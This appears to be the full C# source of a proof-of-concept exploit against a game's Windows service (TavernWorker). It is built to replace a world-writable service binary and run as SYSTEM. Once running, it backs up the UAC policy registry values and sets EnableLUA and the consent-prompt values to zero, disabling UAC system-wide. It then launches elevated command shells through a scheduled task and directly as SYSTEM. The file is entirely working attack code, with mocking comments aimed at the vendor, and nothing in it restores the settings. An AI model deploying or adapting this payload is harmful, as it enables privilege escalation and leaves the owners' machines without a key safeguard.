using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using Microsoft.Win32;

class Program
{
    static void Main() { ServiceBase.Run(new UacDisableService()); }
}

class UacDisableService : ServiceBase
{
    const string PolicyKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
    const string ProofPath = @"C:\ProgramData\poc_uac_proof.txt";
    const string BackupPath = @"C:\ProgramData\poc_uac_registry_backup.txt";

    static readonly string[] UacValues = {
        "EnableLUA",
        "ConsentPromptBehaviorAdmin",
        "ConsentPromptBehaviorUser",
        "PromptOnSecureDesktop",
        "FilterAdministratorToken"
    };

    public UacDisableService()
    {
        ServiceName = "PocPayload";
        CanStop = true;
    }

    protected override void OnStart(string[] args)
    {
        // impersonating TavernWorker.exe. ironmace made that very easy
        ThreadPool.QueueUserWorkItem(_ => Run());
    }

    static void Run()
    {
        var log = new StringBuilder();
        // runs because ironmace thought Everyone:(F) in program files was fine
        log.AppendLine("tavernworker poc - reported to discord, got ignored");
        log.AppendLine(DateTime.Now.ToUniversalTime().ToString("u"));
        log.AppendLine(Environment.UserDomainName + "\\" + Environment.UserName);
        log.AppendLine();

        try
        {
            log.AppendLine("uac before (microsoft's defaults, not ironmace's):");
            log.Append(ReadUacPolicy());
            log.AppendLine();

            BackupRegistry(log);
            log.AppendLine();

            log.AppendLine("turning uac off. they run services as SYSTEM, we can too:");
            SetDword(PolicyKey, "ConsentPromptBehaviorAdmin", 0);
            SetDword(PolicyKey, "ConsentPromptBehaviorUser", 0);
            SetDword(PolicyKey, "PromptOnSecureDesktop", 0);
            SetDword(PolicyKey, "EnableLUA", 0);
            log.AppendLine("    ConsentPromptBehaviorAdmin = 0");
            log.AppendLine("    ConsentPromptBehaviorUser   = 0");
            log.AppendLine("    PromptOnSecureDesktop       = 0");
            log.AppendLine("    EnableLUA                   = 0");
            log.AppendLine();

            log.AppendLine("uac after:");
            log.Append(ReadUacPolicy());
            log.AppendLine();

            string user = GetActiveUser();
            log.AppendLine("console user: " + (user ?? "?"));
            log.AppendLine();

            if (!string.IsNullOrEmpty(user))
            {
                log.AppendLine("elevated cmd for user, no prompt. ironmace couldnt patch a folder acl:");
                string task = "POC_Tavern_UAC_Proof";
                string tr = "cmd.exe /k title UAC-DISABLED-PROOF && color 2F && echo ironmace left Everyone:(F) on the service binary && whoami && net session";
                RunHidden("schtasks.exe", "/delete /tn \"" + task + "\" /f");
                Thread.Sleep(500);
                int create = RunHidden("schtasks.exe",
                    "/create /tn \"" + task + "\" /tr \"" + tr + "\" /sc once /st 00:00 /ru \"" + user + "\" /rl HIGHEST /f");
                log.AppendLine("    schtasks create: " + create);
                Thread.Sleep(500);
                int run = RunHidden("schtasks.exe", "/run /tn \"" + task + "\"");
                log.AppendLine("    schtasks run: " + run);
            }

            log.AppendLine();
            log.AppendLine("system cmd because TavernWorker_1_1 said please:");
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/k title POC-01-SYSTEM-UAC-OFF && color 4F && echo thanks ironmace && whoami && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Normal
            });
        }
        catch (Exception ex)
        {
            log.AppendLine("err: " + ex.Message);
        }

        try { File.WriteAllText(ProofPath, log.ToString()); } catch { }
        try { File.WriteAllText(@"C:\ProgramData\poc_01_tavern.txt", log.ToString()); } catch { }
    }

    static void BackupRegistry(StringBuilder log)
    {
        var sb = new StringBuilder();
        sb.AppendLine("# backup before ironmace's security model touched uac");
        using (var key = Registry.LocalMachine.OpenSubKey(PolicyKey, false))
        {
            if (key == null) { log.AppendLine("    policy key missing"); return; }
            foreach (var name in UacValues)
            {
                object v = key.GetValue(name);
                if (v != null)
                {
                    sb.AppendLine(name + "=" + v);
                    log.AppendLine("    backed up " + name + " = " + v);
                }
            }
        }
        File.WriteAllText(BackupPath, sb.ToString());
        log.AppendLine("    -> " + BackupPath);
    }

    static string ReadUacPolicy()
    {
        var sb = new StringBuilder();
        using (var key = Registry.LocalMachine.OpenSubKey(PolicyKey, false))
        {
            if (key == null) return "    missing\r\n";
            foreach (var name in UacValues)
            {
                object v = key.GetValue(name, "(not set)");
                sb.AppendLine("    " + name + " = " + v);
            }
        }
        return sb.ToString();
    }

    static void SetDword(string subKey, string name, int value)
    {
        using (var key = Registry.LocalMachine.OpenSubKey(subKey, true))
        {
            if (key == null) throw new Exception("Cannot open " + subKey);
            key.SetValue(name, value, RegistryValueKind.DWord);
        }
    }

    static int RunHidden(string file, string args)
    {
        var p = Process.Start(new ProcessStartInfo
        {
            FileName = file,
            Arguments = args,
            UseShellExecute = false,
            CreateNoWindow = true
        });
        p.WaitForExit(15000);
        return p.ExitCode;
    }

    static string GetActiveUser()
    {
        try
        {
            uint sid = WTSGetActiveConsoleSessionId();
            if (sid == 0xFFFFFFFF) return null;
            IntPtr buf;
            int len;
            string user = null, domain = null;
            if (WTSQuerySessionInformation(IntPtr.Zero, (int)sid, 5, out buf, out len) && len > 1)
            { user = Marshal.PtrToStringAnsi(buf); WTSFreeMemory(buf); }
            if (WTSQuerySessionInformation(IntPtr.Zero, (int)sid, 7, out buf, out len) && len > 1)
            { domain = Marshal.PtrToStringAnsi(buf); WTSFreeMemory(buf); }
            if (string.IsNullOrEmpty(user)) return null;
            if (!string.IsNullOrEmpty(domain) && domain != Environment.MachineName)
                return domain + "\\" + user;
            return Environment.MachineName + "\\" + user;
        }
        catch { return null; }
    }

    [DllImport("kernel32.dll")] static extern uint WTSGetActiveConsoleSessionId();
    [DllImport("wtsapi32.dll", SetLastError = true)]
    static extern bool WTSQuerySessionInformation(IntPtr h, int sid, int cls, out IntPtr buf, out int len);
    [DllImport("wtsapi32.dll")] static extern void WTSFreeMemory(IntPtr p);

    protected override void OnStop() { }
}
